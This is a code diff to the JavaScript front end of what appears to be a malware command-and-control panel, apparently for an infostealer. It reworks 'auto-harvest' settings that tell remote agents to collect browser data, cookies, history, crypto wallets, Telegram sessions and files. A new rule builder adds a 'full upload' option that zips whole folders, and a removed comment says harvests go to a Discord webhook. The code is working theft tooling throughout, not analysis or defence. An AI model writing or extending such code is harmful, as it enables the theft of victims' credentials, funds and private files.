@@ -70,8 +70,14 @@
   const autoExtToggle     = $("auto-ext-toggle");
   const autoWalletsToggle = $("auto-wallets-toggle");
   const autoTelegramToggle = $("auto-telegram-toggle");
-  const autoFileExtsInput = $("auto-file-exts");
-  const autoFileNamesInput = $("auto-file-names");
+  const ruleExtInput = $("rule-ext");
+  const ruleNameInput = $("rule-name");
+  const ruleDirInput = $("rule-dir");
+  const ruleFullCheck = $("rule-full");
+  const ruleAddBtn = $("rule-add-btn");
+  const fileRuleListEl = $("file-rule-list");
+  /** @type {{ extension: string, nameContains: string, dirPath: string, fullUpload: boolean }[]} */
+  let fileRules = [];
   const captureHistoryToggle = $("capture-history-toggle");
   const captureCookiesToggle = $("capture-cookies-toggle");
   const historyLimitInput = $("history-limit-input");
@@ -1574,39 +1580,101 @@
   }
 
   // ── Settings (auto-harvest) ───────────────────────────────────
-  function parseListInput(text) {
-    return String(text || "")
-      .split(/[\n,;]+/)
-      .map((s) => s.trim())
-      .filter(Boolean);
+  function normalizeRuleExt(ext) {
+    ext = String(ext || "").trim().toLowerCase();
+    if (!ext) return "";
+    if (ext.startsWith("*.")) ext = ext.slice(1);
+    if (ext && !ext.startsWith(".")) ext = "." + ext;
+    return ext;
   }
 
-  function parseFileFilterFromInputs() {
-    const rawExts = parseListInput(autoFileExtsInput?.value);
-    const extensions = [];
-    const names = [];
-    for (const item of rawExts) {
-      if (item.startsWith(".") || item.startsWith("*.")) {
-        const ext = item.startsWith("*.") ? item.slice(1).toLowerCase() : item.toLowerCase();
-        extensions.push(ext.startsWith(".") ? ext : "." + ext);
-      } else if (item.includes(".") && !item.includes(" ")) {
-        // exact filename e.g. config.json
-        names.push(item);
-        const ext = item.includes(".") ? ("." + item.split(".").pop().toLowerCase()) : "";
-        if (ext && ext !== "." && !extensions.includes(ext)) {
-          // also allow by extension so *.json still catches variants if user listed config.json only? 
-          // Keep exact name only for names list; don't force all .json
-        }
-      } else {
-        names.push(item);
-      }
+  function renderFileRuleList() {
+    if (!fileRuleListEl) return;
+    if (!fileRules.length) {
+      fileRuleListEl.innerHTML = '<li class="file-rule-empty">No rules yet — add extension, name contains, and/or dir path.</li>';
+      return;
     }
-    const nameContains = parseListInput(autoFileNamesInput?.value);
-    return { extensions, names, nameContains };
+    fileRuleListEl.innerHTML = fileRules.map((r, i) => {
+      const parts = [];
+      if (r.extension) parts.push(`ext <code>${esc(r.extension)}</code>`);
+      if (r.nameContains) parts.push(`name ∋ <code>${esc(r.nameContains)}</code>`);
+      if (r.dirPath) parts.push(`dir <code>${esc(r.dirPath)}</code>`);
+      else parts.push("dir <em>default folders</em>");
+      const full = r.fullUpload ? '<span class="badge-full">full upload</span>' : "";
+      return `<li class="file-rule-item" data-idx="${i}">
+        <div>
+          <div>${parts.join(" · ") || "(empty rule)"}${full}</div>
+          <div class="meta">${r.fullUpload ? "Zips entire folder" : "Scans folder for matching files"}</div>
+        </div>
+        <button type="button" class="btn-remove" data-remove="${i}">Remove</button>
+      </li>`;
+    }).join("");
+    fileRuleListEl.querySelectorAll("[data-remove]").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const idx = parseInt(btn.getAttribute("data-remove"), 10);
+        if (!Number.isNaN(idx)) {
+          fileRules.splice(idx, 1);
+          renderFileRuleList();
+          saveSettings();
+        }
+      });
+    });
+  }
+
+  function addFileRuleFromForm() {
+    const extension = normalizeRuleExt(ruleExtInput?.value);
+    const nameContains = String(ruleNameInput?.value || "").trim();
+    const dirPath = String(ruleDirInput?.value || "").trim();
+    const fullUpload = !!(ruleFullCheck && ruleFullCheck.checked);
+    if (!extension && !nameContains && !dirPath) {
+      if (settingsStatus) {
+        settingsStatus.textContent = "Enter extension, name contains, and/or dir path";
+        setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 2500);
+      }
+      return;
+    }
+    if (fullUpload && !dirPath) {
+      if (settingsStatus) {
+        settingsStatus.textContent = "Full upload requires a dir path";
+        setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 2500);
+      }
+      return;
+    }
+    fileRules.push({ extension, nameContains, dirPath, fullUpload });
+    if (ruleExtInput) ruleExtInput.value = "";
+    if (ruleNameInput) ruleNameInput.value = "";
+    if (ruleDirInput) ruleDirInput.value = "";
+    if (ruleFullCheck) ruleFullCheck.checked = false;
+    renderFileRuleList();
+    saveSettings();
+  }
+
+  /** Migrate legacy flat filter → rules[] */
+  function rulesFromLegacyPayload(filter) {
+    if (Array.isArray(filter?.rules) && filter.rules.length) {
+      return filter.rules.map((r) => ({
+        extension: normalizeRuleExt(r.extension || r.ext || ""),
+        nameContains: String(r.nameContains || r.name || "").trim(),
+        dirPath: String(r.dirPath || r.dir || "").trim(),
+        fullUpload: !!(r.fullUpload || r.full),
+      }));
+    }
+    const rules = [];
+    for (const e of filter?.extensions || []) {
+      rules.push({ extension: normalizeRuleExt(e), nameContains: "", dirPath: "", fullUpload: false });
+    }
+    for (const n of filter?.names || []) {
+      rules.push({ extension: "", nameContains: "", dirPath: "", fullUpload: false, /* exact name as contains */ });
+      rules[rules.length - 1].nameContains = n; // treat exact names as name contains for simplicity
+    }
+    for (const c of filter?.nameContains || []) {
+      rules.push({ extension: "", nameContains: String(c).trim(), dirPath: "", fullUpload: false });
+    }
+    return rules.filter((r) => r.extension || r.nameContains || r.dirPath);
   }
 
   async function buildAutoStartEvents(opts) {
-    const { files, ext, wallets, telegram, fileFilter } = opts;
+    const { files, ext, wallets, telegram, rules } = opts;
     let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
     try {
       const s = await rpc("get_capture_settings");
@@ -1616,7 +1684,6 @@
         threadPrefix: s.discord_thread_prefix || "Stuart",
       };
     } catch (_) {}
-    // Agent POSTs harvest to Discord webhook (HTTP); C2 WS only gets a small complete event
     const collectPayload = {
       browsers: true,
       gaming: true,
@@ -1626,20 +1693,14 @@
       wallets: !!wallets,
       telegram: !!telegram,
     };
-    if (files && fileFilter) {
-      collectPayload.fileExtensions = fileFilter.extensions || [];
-      collectPayload.fileNames = fileFilter.names || [];
-      collectPayload.fileNameContains = fileFilter.nameContains || [];
+    if (files && rules?.length) {
+      collectPayload.fileRules = rules;
     }
     const events = [{ event: "collect", payload: collectPayload }];
     if (files) {
       events.push({
         event: "scan_files",
-        payload: {
-          extensions: fileFilter?.extensions || [],
-          names: fileFilter?.names || [],
-          nameContains: fileFilter?.nameContains || [],
-        },
+        payload: { rules: rules || [] },
       });
     }
     if (ext) events.push({ event: "scan_extensions", payload: {} });
@@ -1659,19 +1720,20 @@
       const enabled = !!pluginCfg.autoLoad;
       const events = pluginCfg.autoStartEvents || [];
       const fileEv = events.find(e => e.event === "scan_files");
-      const filter = fileEv?.payload || {};
+      const collectEv = events.find(e => e.event === "collect");
+      const filter = fileEv?.payload || collectEv?.payload || {};
+      fileRules = rulesFromLegacyPayload(filter);
+      if (Array.isArray(collectEv?.payload?.fileRules)) {
+        fileRules = rulesFromLegacyPayload({ rules: collectEv.payload.fileRules });
+      }
       applySettingsUI({
         enabled,
-        files: events.some(e => e.event === "scan_files") || !!(events.find(e => e.event === "collect")?.payload?.files),
+        files: events.some(e => e.event === "scan_files") || !!(collectEv?.payload?.files),
         ext: events.some(e => e.event === "scan_extensions"),
-        wallets: events.some(e => e.event === "scan_wallets") || !!(events.find(e => e.event === "collect")?.payload?.wallets),
-        telegram: events.some(e => e.event === "scan_telegram") || !!(events.find(e => e.event === "collect")?.payload?.telegram),
-        fileExts: [
-          ...(filter.extensions || []),
-          ...(filter.names || []),
-        ].join(", "),
-        fileNames: (filter.nameContains || []).join(", "),
+        wallets: events.some(e => e.event === "scan_wallets") || !!(collectEv?.payload?.wallets),
+        telegram: events.some(e => e.event === "scan_telegram") || !!(collectEv?.payload?.telegram),
       });
+      renderFileRuleList();
     } catch (_) {}
   }
 
@@ -1692,16 +1754,12 @@
     setSub(autoWalletsToggle, "ah-wallets-row", state.wallets);
     setSub(autoTelegramToggle, "ah-telegram-row", state.telegram);
 
+    const filesOn = enabled && !!state.files;
     const block = $("ah-file-list-block");
-    if (block) block.style.opacity = enabled && state.files ? "1" : "0.5";
-    if (autoFileExtsInput) {
-      autoFileExtsInput.disabled = !enabled || !state.files;
-      if (state.fileExts != null) autoFileExtsInput.value = state.fileExts;
-    }
-    if (autoFileNamesInput) {
-      autoFileNamesInput.disabled = !enabled || !state.files;
-      if (state.fileNames != null) autoFileNamesInput.value = state.fileNames;
-    }
+    if (block) block.style.opacity = filesOn ? "1" : "0.5";
+    [ruleExtInput, ruleNameInput, ruleDirInput, ruleFullCheck, ruleAddBtn].forEach((el) => {
+      if (el) el.disabled = !filesOn;
+    });
   }
 
   async function saveSettings() {
@@ -1712,12 +1770,11 @@
     const ext = autoExtToggle ? autoExtToggle.checked : false;
     const wallets = autoWalletsToggle ? autoWalletsToggle.checked : false;
     const telegram = autoTelegramToggle ? autoTelegramToggle.checked : false;
-    const fileFilter = parseFileFilterFromInputs();
     try {
       const body = {
         autoLoad: enabled,
         autoStartEvents: enabled
-          ? await buildAutoStartEvents({ files, ext, wallets, telegram, fileFilter })
+          ? await buildAutoStartEvents({ files, ext, wallets, telegram, rules: fileRules.slice() })
           : [],
       };
       const res = await fetch(`/api/plugins/${PLUGIN_ID}/autoload`, {
@@ -1728,15 +1785,8 @@
       const data = await res.json();
       if (!data.ok) throw new Error(data.error || "failed");
       settingsStatus.textContent = enabled ? "Auto-harvest enabled" : "Auto-harvest disabled";
-      applySettingsUI({
-        enabled,
-        files,
-        ext,
-        wallets,
-        telegram,
-        fileExts: autoFileExtsInput?.value,
-        fileNames: autoFileNamesInput?.value,
-      });
+      applySettingsUI({ enabled, files, ext, wallets, telegram });
+      renderFileRuleList();
     } catch (e) {
       settingsStatus.textContent = `Error: ${e.message}`;
     }
@@ -1922,8 +1972,9 @@
       if (autoExtToggle) autoExtToggle.disabled = true;
       if (autoWalletsToggle) autoWalletsToggle.disabled = true;
       if (autoTelegramToggle) autoTelegramToggle.disabled = true;
-      if (autoFileExtsInput) autoFileExtsInput.disabled = true;
-      if (autoFileNamesInput) autoFileNamesInput.disabled = true;
+      [ruleExtInput, ruleNameInput, ruleDirInput, ruleFullCheck, ruleAddBtn].forEach((el) => {
+        if (el) el.disabled = true;
+      });
       if (captureHistoryToggle) captureHistoryToggle.disabled = true;
       if (captureCookiesToggle) captureCookiesToggle.disabled = true;
       if (historyLimitInput) historyLimitInput.disabled = true;
@@ -1948,23 +1999,28 @@
 
     if (autoHarvestToggle) autoHarvestToggle.addEventListener("change", saveSettings);
     if (autoFilesToggle) autoFilesToggle.addEventListener("change", () => {
-      // Enable/disable file list inputs immediately, then save
       applySettingsUI({
         enabled: autoHarvestToggle.checked,
         files: autoFilesToggle.checked,
         ext: autoExtToggle?.checked,
         wallets: autoWalletsToggle?.checked,
         telegram: autoTelegramToggle?.checked,
-        fileExts: autoFileExtsInput?.value,
-        fileNames: autoFileNamesInput?.value,
       });
       saveSettings();
     });
     if (autoExtToggle) autoExtToggle.addEventListener("change", saveSettings);
     if (autoWalletsToggle) autoWalletsToggle.addEventListener("change", saveSettings);
     if (autoTelegramToggle) autoTelegramToggle.addEventListener("change", saveSettings);
-    if (autoFileExtsInput) autoFileExtsInput.addEventListener("change", saveSettings);
-    if (autoFileNamesInput) autoFileNamesInput.addEventListener("change", saveSettings);
+    if (ruleAddBtn) ruleAddBtn.addEventListener("click", addFileRuleFromForm);
+    [ruleExtInput, ruleNameInput, ruleDirInput].forEach((el) => {
+      if (!el) return;
+      el.addEventListener("keydown", (ev) => {
+        if (ev.key === "Enter") {
+          ev.preventDefault();
+          addFileRuleFromForm();
+        }
+      });
+    });
     if (captureHistoryToggle) captureHistoryToggle.addEventListener("change", saveCaptureSettings);
     if (captureCookiesToggle) captureCookiesToggle.addEventListener("change", saveCaptureSettings);
     if (historyLimitInput) historyLimitInput.addEventListener("change", saveCaptureSettings);
